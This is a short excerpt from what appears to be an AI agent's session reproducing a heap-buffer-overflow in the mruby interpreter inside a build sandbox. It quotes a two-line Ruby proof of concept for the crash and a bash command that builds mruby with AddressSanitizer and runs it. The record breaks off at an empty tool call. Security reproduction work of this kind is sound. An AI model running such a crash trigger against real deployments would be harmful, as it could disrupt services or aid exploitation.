message:
Excellent! The ASAN detected a heap-buffer-overflow! The PoC `a[2, 5] = [4, 5, 6, 7]` on `a = [1, 2, 3]` triggers the vulnerability. Let me get the full ASAN output to understand the exact crash details:

<｜｜DSML｜｜

<function=execute_bash>
<parameter=command>cd /workspace && bash build.sh 'apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq ruby libclang-rt-18-dev >/dev/null 2>&1; cd /gt/_work/src && ruby minirake MRUBY_CONFIG=clang-asan >/dev/null 2>&1; echo "a = [1, 2, 3]" > /tmp/poc.rb && echo "a[2, 5] = [4, 5, 6, 7]" >> /tmp/poc.rb && timeout 30 /gt/_work/src/build/host/bin/mruby /tmp/poc.rb 2>&1; echo "EXIT: $?"'</parameter>
</｜｜DSML｜｜>

<function=execute_bash>
<parameter=command></parameter>
<parameter=is_input>true</parameter>
